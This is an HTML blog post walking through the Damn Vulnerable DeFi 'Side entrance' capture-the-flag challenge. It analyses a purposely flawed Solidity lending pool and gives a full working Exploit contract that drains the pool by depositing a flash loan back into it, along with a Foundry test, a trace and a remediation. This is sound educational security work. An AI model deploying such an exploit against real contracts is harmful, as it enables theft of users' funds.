<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Damn Vulnerable DeFi, #4 Side entrance · transcendental kyberautism
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Vasiliy Yorkin">
<meta name="description" content="Challenge Link to heading A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time. This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. You must take all ETH from the lending pool. Here is the lending pool contract:
// SPDX-License-Identifier: MIT pragma solidity 0.8.12; import {Address} from &#34;openzeppelin-contracts/utils/Address.">
<meta name="keywords" content="Vasiliy Yorkin">
<meta name="fediverse:creator" content="" />


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Damn Vulnerable DeFi, #4 Side entrance">
  <meta name="twitter:description" content="Challenge Link to heading A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time. This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. You must take all ETH from the lending pool. Here is the lending pool contract:
// SPDX-License-Identifier: MIT pragma solidity 0.8.12; import {Address} from &#34;openzeppelin-contracts/utils/Address.">

<meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-4-side-entrance/">
  <meta property="og:site_name" content="transcendental kyberautism">
  <meta property="og:title" content="Damn Vulnerable DeFi, #4 Side entrance">
  <meta property="og:description" content="Challenge Link to heading A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time. This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system. You must take all ETH from the lending pool. Here is the lending pool contract:
// SPDX-License-Identifier: MIT pragma solidity 0.8.12; import {Address} from &#34;openzeppelin-contracts/utils/Address.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-08-11T16:56:00+03:00">
    <meta property="article:modified_time" content="2022-08-11T16:56:00+03:00">
    <meta property="article:tag" content="Blockchain">
    <meta property="article:tag" content="Security">




<link rel="canonical" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-4-side-entrance/">


<link rel="preload" href="https://vyorkin.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />





  
    
    
    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  




  
  <link rel="stylesheet" href="https://vyorkin.org/custom.min.cf4424ca575c8638b55547ace7bc3ab68c44ff1c808b1f1bb2358cdbcdbd8c41.css" integrity="sha256-z0Qkyldchji1VUes57w6toxE/xyAix8bsjWM2829jEE=" crossorigin="anonymous" media="screen" />


<link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">

<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://vyorkin.org/">
      transcendental kyberautism
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://vyorkin.org/about/">about</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://vyorkin.org/posts/">posts</a>
            </li>
          
        
        
          
          
          
            
          
            
              
                <li class="navigation-item menu-separator">
                  <span>|</span>
                </li>
                
              
              <li class="navigation-item">
                <a href="https://vyorkin.org/ru-ru/">ru</a>
              </li>
            
          
            
              
              <li class="navigation-item">
                <a href="https://vyorkin.org/de-de/">de</a>
              </li>
            
          
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-4-side-entrance/">
              Damn Vulnerable DeFi, #4 Side entrance
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="August 11, 2022">
                August 11, 2022
              </time>
            </span>
          </div>
          
          
          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://vyorkin.org/tags/blockchain/">Blockchain</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://vyorkin.org/tags/security/">Security</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <h2 id="challenge">
  Challenge
  <a class="heading-link" href="#challenge">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<blockquote class="quote2 quote2-question">A surprisingly simple lending pool allows anyone to deposit ETH,
and withdraw it at any point in time. This very simple lending
pool has 1000 ETH in balance already, and is offering free flash
loans using the deposited ETH to promote their system. You must
take all ETH from the lending pool.
</blockquote>

<p>Here is the lending pool contract:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> <span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">12</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {Address} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/utils/Address.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">interface</span> IFlashLoanEtherReceiver {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> execute() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @title SideEntranceLenderPool
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> SideEntranceLenderPool {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">using</span> Address <span style="color:#fff;font-weight:bold">for</span> <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">mapping</span>(<span style="color:#fff;font-weight:bold">address</span> =&gt; <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">private</span> balances;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    error NotEnoughETHInPool();
</span></span><span style="display:flex;"><span>    error FlashLoanHasNotBeenPaidBack();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> deposit() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
</span></span><span style="display:flex;"><span>        balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] += <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> withdraw() <span style="color:#fff;font-weight:bold">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> amountToWithdraw = balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>];
</span></span><span style="display:flex;"><span>        balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).sendValue(amountToWithdraw);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; amount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughETHInPool();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        IFlashLoanEtherReceiver(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).execute{<span style="color:#fff;font-weight:bold">value</span>: amount}();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span> &lt; balanceBefore)
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Side entrance lender pool&hellip;🤔 Sounds like a &ldquo;lender pool with a
back door&rdquo; 😂</p>
<h2 id="analysis">
  Analysis
  <a class="heading-link" href="#analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The first thing I&rsquo;ve noticed is that the <code>SideEntranceLenderPool</code>
doesn&rsquo;t use the <code>ReentrancyGuard</code>, in contrast to what we&rsquo;ve
seen in previous challenges. But at this moment it&rsquo;s not obvious
for me how to leverage the re-entrancy here.</p>
<p>The contract has the <code>balances</code> mapping to track the deposited ETH:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">mapping</span>(<span style="color:#fff;font-weight:bold">address</span> =&gt; <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">private</span> balances;
</span></span></code></pre></div><p>Anyone can deposit funds using the <code>deposit</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> deposit() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
</span></span><span style="display:flex;"><span>    balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] += <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And they can withdraw their deposited funds by calling the
<code>withdraw</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> withdraw() <span style="color:#fff;font-weight:bold">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> amountToWithdraw = balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>];
</span></span><span style="display:flex;"><span>    balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).sendValue(amountToWithdraw);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It uses the
<a href="https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern"  class="external-link" target="_blank" rel="noopener">Checks-Effects-Interactions</a>
pattern, so it looks like it is invulnerable to the re-entrancy
attack.</p>
<p>Let&rsquo;s explore what the <code>flashLoan</code> function does:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (balanceBefore &lt; amount) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughETHInPool();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    IFlashLoanEtherReceiver(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>).execute{<span style="color:#fff;font-weight:bold">value</span>: amount}();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span> &lt; balanceBefore)
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It takes an <code>amount</code> of Ether that the user wants to borrow.</li>
<li>Check if the lending pool has enough funds.</li>
<li>Assumes that the <code>msg.sender</code> is a contract that implements
the <code>IFlashLoanEtherReceiver</code> interface and calls the
<code>execute</code> function on it sending the requested amount of
Ether.</li>
<li>Afterward, it checks that the flash loan has been repaid.</li>
</ul>
<p>The problem is that the lending pool contract doesn&rsquo;t check that
its balance is less than or equal to the sum of all the
deposited funds. What if we take a flash loan of all the
pool&rsquo;s funds and use the borrowed funds to make a deposit
repaying the loan simultaneously? That should let us take all
ETH and drain the pool.</p>
<h2 id="exploit">
  Exploit
  <a class="heading-link" href="#exploit">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>We need a contract that is going to take the loan. Let&rsquo;s call it
<code>Exploit</code>. It should implement the <code>IFlashLoanEtherReceiver</code>
interface and have the <code>receive</code> function so we could withdraw
our deposited funds later.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">contract</span> Exploit <span style="color:#fff;font-weight:bold">is</span> IFlashLoanEtherReceiver {
</span></span><span style="display:flex;"><span>    SideEntranceLenderPool <span style="color:#fff;font-weight:bold">private</span> pool;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> owner;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(SideEntranceLenderPool _pool) {
</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
</span></span><span style="display:flex;"><span>        pool = _pool;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> execute() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == <span style="color:#fff;font-weight:bold">address</span>(pool), <span style="color:#0ff;font-weight:bold">&#34;Sender is not a pool&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == owner, <span style="color:#0ff;font-weight:bold">&#34;Not an owner&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = <span style="color:#fff;font-weight:bold">address</span>(pool).<span style="color:#fff;font-weight:bold">balance</span>;
</span></span><span style="display:flex;"><span>        pool.flashLoan(poolBalance);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// Send stolen funds to the owner (attacker)
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">payable</span>(owner).sendValue(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The following sequence diagram shows our exploit scenario:</p>
<div class="mermaid">
%%{init: {'theme':'neutral'}}%%
sequenceDiagram
    actor A as Attacker
    participant E as Exploit
    participant P as SideEntranceLenderPool

A->>E: new(pool)
activate E
A->>E: run()
E->>P: flashLoan(address(pool).balance)
activate P
Note right of E: take a flash loan of all the pool's funds
P->>E: execute()
Note right of E: the pool calls execute() sending all the Ether
E->>P: deposit(msg.value)
Note right of E: deposit all the borrowed funds
P->>P: balances[msg.sender] += msg.value
P-->>E: ()
deactivate P
E->>P: withdraw()
Note right of E: immediately withdraw everything
P->>P: balances[msg.sender] = 0
P->>E: sendValue(...)
Note left of P: sendValue(...) calls the receive() function
P->>P: check address(this).balance < balanceBefore
P-->>E: ()
E->>A: sendValue(...)
Note right of A: withdraw stolen ETH
deactivate E

</div>


<p>The exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Exploit <span style="color:#fff;font-weight:bold">is</span> IFlashLoanEtherReceiver {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">using</span> Address <span style="color:#fff;font-weight:bold">for</span> <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    SideEntranceLenderPool <span style="color:#fff;font-weight:bold">private</span> pool;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">private</span> owner;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(SideEntranceLenderPool _pool) {
</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>;
</span></span><span style="display:flex;"><span>        pool = _pool;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> execute() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == <span style="color:#fff;font-weight:bold">address</span>(pool), <span style="color:#0ff;font-weight:bold">&#34;Sender is not a pool&#34;</span>);
</span></span><span style="display:flex;"><span>        pool.deposit{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>}();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == owner, <span style="color:#0ff;font-weight:bold">&#34;Not an owner&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = <span style="color:#fff;font-weight:bold">address</span>(pool).<span style="color:#fff;font-weight:bold">balance</span>;
</span></span><span style="display:flex;"><span>        pool.flashLoan(poolBalance);
</span></span><span style="display:flex;"><span>        pool.withdraw();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">payable</span>(owner).sendValue(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
</span></span><span style="display:flex;"><span>    Exploit expl = <span style="color:#fff;font-weight:bold">new</span> Exploit(sideEntranceLenderPool);
</span></span><span style="display:flex;"><span>    expl.run();
</span></span><span style="display:flex;"><span>    vm.stopPrank();
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    validation();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The forge&rsquo;s trace reflects what we&rsquo;ve seen on the diagram above:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>[304450] SideEntrance::testExploit()
</span></span><span style="display:flex;"><span>  ├─ [0] VM::startPrank(Attacker: [0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7])
</span></span><span style="display:flex;"><span>  │   └─ ← ()
</span></span><span style="display:flex;"><span>  ├─ [225707] → new Exploit@<span style="color:#0ff;font-weight:bold">&#34;0x8ff7…c3ec&#34;</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#ff0;font-weight:bold">905</span> bytes of code
</span></span><span style="display:flex;"><span>  ├─ [44491] Exploit::run()
</span></span><span style="display:flex;"><span>  │   ├─ [37187] Side Entrance Lender Pool::flashLoan(1000000000000000000000)
</span></span><span style="display:flex;"><span>  │   │   ├─ [29848] Exploit::execute{value: 1000000000000000000000}()
</span></span><span style="display:flex;"><span>  │   │   │   ├─ [22410] Side Entrance Lender Pool::deposit{value: 1000000000000000000000}()
</span></span><span style="display:flex;"><span>  │   │   │   │   └─ ← ()
</span></span><span style="display:flex;"><span>  │   │   │   └─ ← ()
</span></span><span style="display:flex;"><span>  │   │   └─ ← ()
</span></span><span style="display:flex;"><span>  │   ├─ [5971] Side Entrance Lender Pool::withdraw()
</span></span><span style="display:flex;"><span>  │   │   ├─ [55] Exploit::fallback{value: 1000000000000000000000}()
</span></span><span style="display:flex;"><span>  │   │   │   └─ ← ()
</span></span><span style="display:flex;"><span>  │   │   └─ ← ()
</span></span><span style="display:flex;"><span>  │   ├─ [0] Attacker::fallback{value: 1000000000000000000000}()
</span></span><span style="display:flex;"><span>  │   │   └─ ← ()
</span></span><span style="display:flex;"><span>  │   └─ ← ()
</span></span><span style="display:flex;"><span>  ├─ [0] VM::stopPrank()
</span></span><span style="display:flex;"><span>  │   └─ ← ()
</span></span><span style="display:flex;"><span>  └─ ← ()
</span></span></code></pre></div><h2 id="remediation">
  Remediation
  <a class="heading-link" href="#remediation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Use the <code>ReentrancyGuard</code> from OpenZeppelin to fix the
<a href="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/#cross-function-reentrancy"  class="external-link" target="_blank" rel="noopener">cross-function
reentrancy</a>.</p>
<h2 id="references">
  References
  <a class="heading-link" href="#references">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<ul>
<li><a href="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/#cross-function-reentrancy"  class="external-link" target="_blank" rel="noopener">Cross-function
Reentrancy</a></li>
<li><a href="https://swcregistry.io/docs/SWC-107"  class="external-link" target="_blank" rel="noopener">SWC-107</a></li>
</ul>
<hr>
<p>Thanks for reading! The solution code is
<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/side-entrance/SideEntrance.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>Let&rsquo;s move on to the next challenge &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder" >#5
The rewarder</a>!</p>

        
        <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
        <script>
            mermaid.initialize({ startOnLoad: true });
        </script>
        
      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
    onload="renderMathInElement(document.body,
      {
        delimiters: [
          {left: '$$', right: '$$', display:true},
          {left: '$', right: '$', display:false},
          {left: '\\(', right: '\\)', display: false},
          {left: '\\[', right: '\\]', display: true}
